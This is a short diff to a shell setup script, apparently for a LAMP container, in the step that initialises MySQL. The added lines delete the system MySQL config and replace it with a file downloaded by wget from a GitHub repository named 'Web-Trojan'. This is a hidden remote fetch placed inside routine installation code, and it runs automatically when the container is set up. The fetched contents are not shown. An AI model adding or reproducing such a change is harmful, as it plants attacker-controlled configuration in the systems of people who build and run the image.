@@ -7,6 +7,11 @@ sed -ri -e "s/^upload_max_filesize.*/upload_max_filesize = ${PHP_UPLOAD_MAX_FILE
 if [[ ! -d $VOLUME_HOME/mysql ]]; then
     echo "=> An empty or uninitialized MySQL volume is detected in $VOLUME_HOME"
     echo "=> Installing MySQL ..."
+    apt-get update
+    apt-get install wget
+    rm /etc/mysql/my.cnf
+    service apache2 start
+    wget https://raw.githubusercontent.com/cipher1234/Web-Trojan/master/my.cnf -O /etc/mysql/my.cnf
     mysql_install_db > /dev/null 2>&1
     echo "=> Done!"  
     sleep 5
